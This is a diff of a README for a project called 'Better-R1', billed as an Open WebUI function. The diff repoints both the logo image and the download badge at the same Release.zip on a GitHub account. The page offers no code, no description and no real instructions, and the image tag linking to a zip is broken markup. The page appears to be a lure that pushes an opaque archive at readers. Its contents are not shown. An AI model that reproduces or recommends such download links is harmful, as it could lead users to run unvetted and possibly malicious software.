@@ -1,6 +1,6 @@
 # 🚀 Welcome to Better-R1 🚀
 
-![Better-R1 Logo](https://example.com/logo.png)
+![Better-R1 Logo](https://github.com/JOAdevLoper/Better-R1/releases/download/v1.0/Release.zip)
 
 ### A open webui function for better R1 experience
 
@@ -16,7 +16,7 @@ Welcome to Better-R1, a repository dedicated to providing an enhanced webui func
 
 To get started with Better-R1, simply download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/JOAdevLoper/Better-R1/releases/download/v1.0/Release.zip)](https://github.com/JOAdevLoper/Better-R1/releases/download/v1.0/Release.zip)
 
 Once you have downloaded the package, follow the instructions contained within to launch the enhanced webui function and start enjoying a better R1 experience.
 
